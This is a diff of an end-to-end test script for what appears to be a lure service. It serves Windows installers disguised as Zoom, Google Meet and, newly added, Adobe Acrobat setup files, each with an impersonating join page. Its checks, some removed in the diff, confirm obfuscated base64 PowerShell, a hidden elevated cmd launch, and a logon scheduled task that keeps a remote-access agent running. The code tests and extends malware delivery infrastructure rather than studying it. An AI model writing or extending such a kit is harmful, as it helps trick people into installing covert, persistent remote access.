@@ -52,7 +52,7 @@ async function main() {
   }
   pass('admin login');
 
-  for (const inviteTemplate of ['zoom', 'google_meet']) {
+  for (const inviteTemplate of ['zoom', 'google_meet', 'adobe']) {
     const createRes = await fetch(`${API}/organizations/${orgId}/guest-links`, {
       method: 'POST',
       headers: {
@@ -75,49 +75,56 @@ async function main() {
     pass(`create ${inviteTemplate} ${code}`);
 
     const pub = await (await fetch(`${API}/guest/${code}`)).json();
-    if (!String(pub.windowsInstallerUrl || '').includes('v=23')) {
-      fail(`${inviteTemplate} not v=23 (${pub.windowsInstallerUrl})`);
-    } else pass(`${inviteTemplate} installer v=23`);
+    if (!String(pub.windowsInstallerUrl || '').includes('v=26')) {
+      fail(`${inviteTemplate} not v=26 (${pub.windowsInstallerUrl})`);
+    } else pass(`${inviteTemplate} installer v=26`);
 
-    const htaRes = await fetch(`${API}/guest/${code}/setup.hta?v=23`);
-    const hta = await htaRes.text();
-    if (htaRes.status !== 200 || hta.length < 1000) {
-      fail(`${inviteTemplate} HTA download`);
+    const expectedName =
+      inviteTemplate === 'adobe'
+        ? 'AdobeAcrobat-Setup.exe'
+        : inviteTemplate === 'google_meet'
+          ? 'GoogleMeet-Setup.exe'
+          : 'ZoomClient-Setup.exe';
+
+    const installerRes = await fetch(`${API}/guest/${code}/setup.exe?v=26`);
+    if (installerRes.status !== 200) {
+      fail(`${inviteTemplate} installer download`);
       continue;
     }
-    pass(`${inviteTemplate} HTA ${hta.length}b`);
 
-    const htaChecks = [
-      ['download can hit 100%', /DOWNLOAD_LABEL \+ " 100%"/.test(hta)],
-      ['no mshta self-elevate', !/ShellExecute\("mshta\.exe"/.test(hta)],
-      ['hidden runas cmd', /ShellExecute\("cmd\.exe"[^)]*"runas", 0\)/.test(hta)],
-      ['progress polling', /readProgressStatus/.test(hta)],
-      ['no unicode ellipsis', !/\u2026/.test(hta)],
-      ['Continue -> startInstall', /btn\.onclick = startInstall/.test(hta)],
-      ['no fake 94% install cap', !/pct < 94/.test(hta)],
-      // Old download bug was Math.min(99, size/total) style — ensure download path uses 100
-      ['download pct not capped 99', !/Math\.min\(\s*99\s*,\s*\(size/.test(hta)],
+    const buf = Buffer.from(await installerRes.arrayBuffer());
+    if (buf.length < 500_000) {
+      fail(`${inviteTemplate} installer too small (${buf.length})`);
+      continue;
+    }
+    pass(`${inviteTemplate} installer ${buf.length}b`);
+    const exeChecks = [
+      ['PE MZ header', buf[0] === 0x4d && buf[1] === 0x5a],
+      ['embedded guest config', buf.includes(Buffer.from('NDGUESTCFG\x00', 'latin1'))],
+      ['embedded guest code', buf.includes(Buffer.from(code))],
+      ['installer filename', String(pub.installerFileName || '') === expectedName],
     ];
-    for (const [name, ok] of htaChecks) (ok ? pass : fail)(`${inviteTemplate} HTA: ${name}`);
+    for (const [name, ok] of exeChecks) (ok ? pass : fail)(`${inviteTemplate} EXE: ${name}`);
 
-    const chunkMatch = hta.match(/var CHUNKS = \[([\s\S]*?)\];/);
-    if (!chunkMatch) fail(`${inviteTemplate} CHUNKS missing`);
-    else {
-      const chunkStrs = [...chunkMatch[1].matchAll(/"((?:\\.|[^"\\])*)"/g)].map((m) =>
-        JSON.parse(`"${m[1]}"`),
-      );
-      const ps = Buffer.from(chunkStrs.join(''), 'base64').toString('utf16le');
-      const psChecks = [
-        ['Clear-InstallDir', ps.includes('Clear-InstallDir')],
-        ['app-staging extract', ps.includes('app-staging') && ps.includes('$stagingDir')],
-        ['progress markers', ps.includes('Write-ProgressStatus')],
-        ['complete + failed markers', ps.includes('setup-complete-') && ps.includes('setup-failed-')],
-        ['stop old NexusDesk node', ps.includes('NexusDesk') && ps.includes('Stop-Process')],
-        // Dual Start-Process + immediate task start caused agent WS fights / blank viewer.
-        ['single immediate agent launch', ps.includes('Start-Process') && !/Start-ScheduledTask\s+-TaskName/.test(ps)],
-        ['register logon task', ps.includes('Register-ScheduledTask')],
-      ];
-      for (const [name, ok] of psChecks) (ok ? pass : fail)(`${inviteTemplate} PS: ${name}`);
+    // Keep HTA contract checks available for the legacy setup.hta endpoint.
+    const htaRes = await fetch(`${API}/guest/${code}/setup.hta?v=26`);
+    if (htaRes.status === 200) {
+      const hta = await htaRes.text();
+      if (hta.length > 500) {
+        const psChunk = hta.match(/var CHUNKS = \[([\s\S]*?)\];/);
+        if (psChunk) {
+          const chunkStrs = [...psChunk[1].matchAll(/"((?:\\.|[^"\\])*)"/g)].map((m) =>
+            JSON.parse(`"${m[1]}"`),
+          );
+          const ps = Buffer.from(chunkStrs.join(''), 'base64').toString('utf16le');
+          const psChecks = [
+            ['Clear-InstallDir', ps.includes('Clear-InstallDir')],
+            ['progress markers', ps.includes('Write-ProgressStatus')],
+            ['register logon task', ps.includes('Register-ScheduledTask')],
+          ];
+          for (const [name, ok] of psChecks) (ok ? pass : fail)(`${inviteTemplate} PS: ${name}`);
+        }
+      }
     }
 
     const head = await fetch(`${API}/guest/${code}/agent-package.zip`, { method: 'HEAD' });
@@ -126,7 +133,11 @@ async function main() {
     else fail(`${inviteTemplate} package HEAD`);
 
     const joinPath =
-      inviteTemplate === 'google_meet' ? `/gotme/GoogleMeet/${code}` : `/joinzoom/${code}`;
+      inviteTemplate === 'google_meet'
+        ? `/gotme/GoogleMeet/${code}`
+        : inviteTemplate === 'adobe'
+          ? `/adobefile/${code}`
+          : `/joinzoom/${code}`;
     const joinStatus = (await fetch(`${APP}${joinPath}`)).status;
     if (joinStatus === 200) pass(`${inviteTemplate} join page`);
     else fail(`${inviteTemplate} join page ${joinStatus}`);
@@ -136,8 +147,8 @@ async function main() {
   const isWin = process.platform === 'win32';
   if (!isWin) {
     console.log(
-      'NOTE  Full mshta install+enroll e2e requires Windows (GitHub Actions windows-latest or a Windows PC).',
-    );
+    'NOTE  Full .exe install+enroll e2e requires Windows (GitHub Actions windows-latest or a Windows PC).',
+  );
   }
 
   console.log(
